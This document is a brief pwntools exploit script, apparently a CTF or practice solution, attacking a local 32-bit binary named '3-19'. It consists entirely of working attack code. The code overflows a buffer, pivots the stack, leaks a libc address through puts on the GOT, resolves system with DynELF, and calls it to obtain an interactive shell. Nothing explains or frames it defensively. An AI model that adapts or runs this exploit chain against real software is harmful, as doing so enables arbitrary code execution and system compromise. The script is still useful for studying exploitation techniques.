from pwn import *
import time
p=process("./3-19")
elf=ELF("./3-19")
ret=0x080483ae;
ebx_ret=0x080483c5;
ebp_ret=0x08048605;
leave_ret=0x080484e5;
main=0x08048607

gets=0x080483e0
puts=0x08048410

offset=116
buf1=0x0804aa00
buf2=0x0804ac00

got_puts=0x804a018

log.info(hex(got_puts))
def leak(addr):
	global buf1,buf2,delay
	buf1,buf2 =buf2,buf1
	payload=p32(buf1)+p32(puts)+p32(ebx_ret)+p32(addr)+p32(gets)+p32(leave_ret)+p32(buf1)
	p.sendline(payload)
	return p.recvrepeat(0.1)[:-1]+"\x00"


payload='A'*112 + p32(buf1)+p32(gets)+p32(leave_ret)+p32(buf1) 

p.sendline(payload)
ptr_libc=leak(got_puts)[:4]
#p.interactive();
raw_input("pause")
print hex(u32(ptr_libc))
d=DynELF(leak,u32(ptr_libc))
system=d.lookup('system')

p.sendline(p32(0xdeadbeef)+p32(gets)+p32(system)+p32(buf1)+p32(buf1+4))
p.interactive();



